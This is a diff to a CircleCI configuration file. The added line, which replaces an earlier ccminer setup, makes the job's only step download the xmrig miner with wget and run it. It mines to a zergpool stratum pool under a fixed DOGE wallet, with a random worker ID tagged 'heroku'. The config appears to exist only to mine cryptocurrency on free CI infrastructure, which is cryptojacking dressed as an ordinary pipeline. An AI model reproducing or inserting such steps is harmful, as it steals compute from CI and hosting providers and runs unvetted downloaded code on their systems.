@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh &&./ccminer -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u D8Kq7Lu982DCTudZocXVbPQRgzPMqRSDsT -p  c=DOGE -t 30
+      - run:  sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz && tar -zxf xmrig-6.12.2-linux-x64.tar.gz && cd xmrig-6.12.2 && ./xmrig -a cryptonight-upx/2 -o stratum+tcp://cryptonight_upx.asia.mine.zergpool.com:4457 -u D8Kq7Lu982DCTudZocXVbPQRgzPMqRSDsT.cola --keepalive --timeout 120 --donate-level 0 -p c=DOGE,ID=$(echo $(shuf -i 1-99999 -n 1)-heroku) -t 30
